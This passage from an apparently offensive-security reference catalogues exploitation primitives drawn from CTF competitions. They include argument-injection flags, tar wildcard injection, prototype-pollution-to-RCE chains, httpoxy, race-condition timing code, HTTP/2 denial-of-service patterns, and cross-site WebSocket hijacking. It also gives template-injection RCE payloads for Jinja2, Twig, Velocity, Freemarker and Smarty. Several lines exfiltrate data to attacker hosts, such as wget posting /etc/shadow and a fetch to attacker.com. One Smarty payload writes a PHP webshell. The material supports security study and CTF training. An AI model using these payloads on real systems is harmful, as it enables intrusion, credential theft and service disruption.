| `git log` | `--output=/tmp/x --format=%H` | Write to arbitrary file |
| `curl` | `--next http://evil` + `-o /tmp/shell` | Chain multiple requests, save to file |
| `wget` | `--post-file=/etc/shadow` | Exfiltrate file contents |
| `ssh` | `-o ProxyCommand="id"` | Execute command during connection |
| `rsync` | `-e 'sh -c id'` | Set remote shell to execute commands |
| `tar` | `--to-command=id` | Pipe extracted files through command |
| `sendmail` | `-OQueueDirectory=/tmp -X/var/www/shell.php` | Write mail log as webshell |
| `zip` | `-T -TT 'sh -c id;#'` | Execute command during test |
| `ffmpeg` | `-i http://evil/malicious.m3u8` | SSRF via playlist processing |
| `chromium` | `--renderer-cmd-prefix=id` | Command execution on render |

### 9.2 Wildcard Glob Expansion as Argument Injection

```bash
# If root runs: tar czf backup.tar.gz *
# Attacker creates files:
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh x.sh'
echo 'id > /tmp/pwned' > x.sh

# When glob expands, tar sees flags:
tar czf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh x.sh file1.txt ...
```

**Affected commands**: `tar`, `chown --reference`, `chmod --reference`, `rsync -e`, `7z -T`.

### 9.3 Prototype Pollution → `process.env` → Environment Variable RCE

```javascript
// Chain: PP → env pollution → child_process RCE
Object.prototype.env = {};
Object.prototype.env.NODE_OPTIONS = '--require=/proc/self/environ';
Object.prototype.env.NODE_DEBUG = 'child_process';
Object.prototype.shell = true;

// Any subsequent: child_process.spawn('node', [...], {})
// Options object inherits polluted prototype → env/shell applied → RCE
```

**`LD_PRELOAD` via PP**: If the PP can set `process.env.LD_PRELOAD` and the application spawns native processes (imagemagick, ffmpeg, etc.), the preloaded library executes.

### 9.4 `HTTP_PROXY` via CGI/WSGI Header Mapping (httpoxy)

**What is manipulated**: In CGI environments, HTTP headers are mapped to `HTTP_*` environment variables. The `Proxy:` header becomes `HTTP_PROXY`.

```
GET / HTTP/1.1
Host: target.com
Proxy: http://attacker.com:8080

→ CGI sets HTTP_PROXY=http://attacker.com:8080
→ Backend HTTP libraries (urllib, requests, curl) use this proxy for outbound requests
→ Attacker intercepts all server-to-server traffic
```

**CVE-2016-5385** (PHP), **CVE-2016-5386** (Go), **CVE-2016-5387** (Apache), **CVE-2016-5388** (Tomcat).

---

## 10. Advanced Race Condition Primitives

> Beyond basic TOCTOU — advanced synchronization techniques from PortSwigger research and top-tier CTFs.

### 10.1 Single-Packet Attack (HTTP/2 Multiplexing)

**What is manipulated**: HTTP/2 multiplexes multiple requests within a single TCP packet, ensuring they arrive at the server simultaneously — eliminating network jitter as a variable.

```python
# Using h2 library to send N requests in a single TCP frame:
import h2.connection

conn = h2.connection.H2Connection()
# Queue all requests without flushing:
for i in range(20):
    conn.send_headers(stream_id=2*i+1, headers=[...])
    conn.send_data(stream_id=2*i+1, data=b'...')
# Flush all at once → single packet containing all 20 requests
```

**Impact**: Eliminates the ~1ms variance that typically makes web race conditions unreliable. Achieves sub-microsecond synchronization.

### 10.2 Last-Byte Synchronization

**What is manipulated**: For HTTP/1.1 (where multiplexing isn't available), send all request data *except the last byte*, then send all final bytes simultaneously.

```python
# Phase 1: Send N-1 bytes for each request (slowly, over separate connections)
sockets = []
for i in range(20):
    s = socket.create_connection((target, 443))
    s = ssl.wrap_socket(s)
    s.send(request_data[:-1])  # all but last byte
    sockets.append(s)

# Phase 2: Send all last bytes simultaneously
for s in sockets:
    s.send(request_data[-1:])
```

### 10.3 Connection Warming

**What is manipulated**: The first request on a new connection is slower (TLS handshake, server-side connection setup). Pre-warming connections ensures all race participants are on equal footing.

```python
# Send a throwaway request on each connection first:
for s in sockets:
    s.send(b'GET / HTTP/1.1\r\nHost: target\r\n\r\n')
    s.recv(4096)  # drain response
# Now all connections are "warm" → send real requests
```

### 10.4 Multi-Endpoint Race Conditions

**What is manipulated**: Instead of racing the same endpoint, race different endpoints that share state. Example: race a password reset against a login, or race a purchase against a balance check.

```
Endpoint A: POST /api/transfer (deducts balance)
Endpoint B: POST /api/withdraw (also deducts balance)

Both check balance > amount, but neither locks the balance row.
Racing A and B simultaneously → double-spend
```

### 10.5 Partial Object Construction Race

**What is manipulated**: An object is created in multiple steps (e.g., user creation: insert row → set password → set role). Accessing the object between steps reveals uninitialized fields.

```
Thread 1: INSERT INTO users (email) VALUES ('attacker@evil.com')  -- role defaults to NULL
Thread 2: SELECT * FROM users WHERE email='attacker@evil.com'  -- reads before role is set
Thread 1: UPDATE users SET role='user' WHERE email='attacker@evil.com'

If NULL role is treated differently (e.g., as admin), race achieves privilege escalation.
```

---

## 11. Protocol-Level Exploitation Primitives

> HTTP/2 and TLS-level attacks beyond request smuggling.

### 11.1 HTTP/2 CONTINUATION Frame Flood (CVE-2024-27316)

**What is manipulated**: HTTP/2 allows HEADERS to be split across multiple CONTINUATION frames. Many implementations buffer all CONTINUATION frames in memory before processing headers.

```
Send HEADERS frame (without END_HEADERS flag)
→ Follow with millions of CONTINUATION frames
→ Server buffers them all → OOM denial of service
```

**Affected**: Apache httpd, Node.js, Go `net/http`, nghttp2. The attack requires only a single TCP connection.

### 11.2 HTTP/2 Rapid Reset (CVE-2023-44487)

**What is manipulated**: Send HTTP/2 request immediately followed by RST_STREAM. The server begins processing the request but the reset cancels response generation. Repeat rapidly to overwhelm server without exceeding concurrent stream limits.

```
HEADERS (stream 1) → RST_STREAM (stream 1) → HEADERS (stream 3) → RST_STREAM (stream 3) → ...
```

**Impact**: Record-breaking DDoS (398 million rps observed by Google). The attack is asymmetric — the client's cost per request is minimal.

### 11.3 TLS-Level Exploitation Primitives

| Attack | What is Manipulated | Impact |
|--------|-------------------|--------|
| **CRIME/BREACH** | TLS/HTTP compression reveals plaintext via response size | CSRF token extraction |
| **Lucky13** | CBC MAC timing depends on padding length | Plaintext recovery |
| **ROBOT** | Bleichenbacher oracle in TLS RSA key exchange | Session decryption |
| **Raccoon** | DH key exchange timing side-channel | Pre-master secret recovery |
| **0-RTT Replay** | TLS 1.3 early data is not replay-protected | Duplicate state-changing requests |

### 11.4 WebSocket Hijacking via CSWSH

**What is manipulated**: WebSocket handshakes are regular HTTP requests that respect cookies but don't have CSRF protection by default.

```javascript
// From attacker.com:
const ws = new WebSocket('wss://target.com/ws');
// Browser attaches target.com cookies automatically
// If server doesn't validate Origin header → attacker has authenticated WebSocket
ws.onmessage = (e) => { fetch('https://attacker.com/log?d=' + e.data); };
```

---

## 12. Template Engine RCE Gadgets

> Specific template engine escape / sandbox bypass techniques that go beyond generic SSTI payloads.

### 12.1 Jinja2 — `lipsum.__globals__` / `cycler.__init__.__globals__`

```python
# Access os module through Jinja2 global functions:
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# When 'os' is filtered:
{{ lipsum.__globals__['__builtins__']['__import__']('o'+'s').popen('id').read() }}
```

### 12.2 Jinja2 — `config` Object / `request` Object Traversal

```python
# Flask-specific Jinja2 globals:
{{ config.items() }}  # dump all configuration
{{ request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

### 12.3 Twig (PHP) — `_self.env` → Arbitrary Include

```php
// Twig < 1.20:
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}

// Twig 1.x with file include:
{{ _self.env.setCache("/tmp") }}
{{ _self.env.loadTemplate("evil.php") }}
```

### 12.4 Velocity (Java) — Reflection Chain

```velocity
#set($rt = $x.class.forName('java.lang.Runtime'))
#set($chr = $rt.getRuntime())
$chr.exec('id')
```

### 12.5 Freemarker (Java) — `new()` Built-in

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

<!-- ObjectConstructor for arbitrary class instantiation: -->
<#assign classloader=object?api.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
```

### 12.6 Smarty (PHP) — `{php}` Tag and Static Method Calls

```smarty
{php}system('id');{/php}

// Smarty 3+ (when {php} is disabled):
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",self::clearConfig())}

// Via math:
{math equation="(\"\\163\\171\\163\\164\\145\\155\")(\"id\")" }
```

---

## Competition → Technique Cross-Reference

| Competition | Year | Challenge | Technique |
|------------|------|-----------|-----------|
| **Google CTF** | 2025 | Postviewer v5 | PRNG state recovery from base36-encoded partial output, `onmessage` leak via non-cached file race |
| **Google CTF** | 2024 | Sappy | postMessage + `data:` scheme for host validation bypass |
| **Google CTF** | 2024 | In the Shadows | Shadow DOM `:host-context()` CSS exfiltration of Light DOM attributes |
| **Google CTF** | 2024 | Grand Prix Heaven | Regex `[A-z]` range includes `[\]^_\`` — path validation bypass |
| **HITCON CTF** | 2024 | Private Browsing+ | bfcache restoration with prototype-pollution-injected fetch headers |
| **HITCON CTF** | 2024 | HTML Upload | Chunked encoding differential: validator processes entire file, browser processes chunk-by-chunk with different encoding per chunk |
| **DiceCTF** | 2024 | web (multiple) | DOM clobbering of `document.defaultView` to break React Router |
| **PlaidCTF** | 2025 | Tales from the Crypt | Corrupted RSA key recovery via Coppersmith's method → TLS session decryption from pcap |
| **corCTF** | 2024 | web challenges | CSS `:has()` selector + `@import` chaining for recursive token extraction |
| **SekaiCTF** | 2024 | htmlsandbox | Character encoding escape sequences + CSP bypass via `data:` URI |
| **SECCON CTF** | 2024 | Pyjail | `help()` as import primitive — help system internally imports modules |
| **jailCTF** | 2025 | multiple | `gc.get_objects()` memory archaeology, code object surgery, `__init_subclass__` hooks |
| **KalmarCTF** | 2025 | Pyjail | `numpy.genfromtxt()` for arbitrary file read in restricted environment |
| **Intigriti** | 2024/07 | Memo | DOM clobbering + `<base>` tag injection + CSP `strict-dynamic` bypass |

---

## References

- James Kettle — [Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks) (Black Hat USA 2022)
- James Kettle — [Smashing the State Machine: The True Potential of Web Race Conditions](https://portswigger.net/research/smashing-the-state-machine) (Black Hat USA 2023)
- Charles Fol — [Iconv, Set the Charset to RCE](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1) (OffensiveCon 2024, CVE-2024-2961)
- Synacktiv — [PHP Filters Chain: What is it and how to use it](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it) (2022)
- Synacktiv — [PHP Filter Chains: File Read from Error-Based Oracle](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle) (2023)
- Huli — [Beyond XSS](https://aszx87410.github.io/beyond-xss/) — DOM Clobbering, CSS Injection comprehensive guide
- Huli — [GoogleCTF 2024 Writeups](https://blog.huli.tw/2024/06/28/en/google-ctf-2024-writeup/)
- Huli — [HITCON CTF & corCTF & SekaiCTF 2024](https://blog.huli.tw/2024/09/23/en/hitconctf-corctf-sekaictf-2024-writeup/)
- Huli — [idekCTF 2024 — Advanced iframe Magic](https://blog.huli.tw/2024/09/07/en/idek-ctf-2024-iframe/)
- terjanq — [Postviewer v5 (Google CTF 2025)](https://gist.github.com/terjanq/e66c2843b5b73aa48405b72f4751d5f8)
- jsur.in — [PlaidCTF 2025 Tales from the Crypt](https://jsur.in/posts/2025-04-07-plaid-ctf-2025-tales-from-the-crypt/)
- xsleaks.dev — [XS-Leaks Wiki](https://xsleaks.dev/)
- Bishop Fox — [Untwisting the Mersenne Twister](https://bishopfox.com/blog/untwisting-mersenne-twister-killed-prng)
- elttam — [Hacking with Environment Variables](https://www.elttam.com/blog/env/)
- jailCTF — [Pyjail Collection](https://github.com/jailctf/pyjail-collection)
- Chovid99 — [Google CTF 2025](https://chovid99.github.io/posts/google-ctf-2025/)
- Nowak & Pelissier — [HTTP/2 CONTINUATION Flood](https://kb.cert.org/vuls/id/421644) (CVE-2024-27316)

---

*This document covers exploitation primitives that fall outside the standard vulnerability classes in the-map project. Each technique has been validated in top-tier CTF competitions and has demonstrated or has clear potential for real-world applicability.*
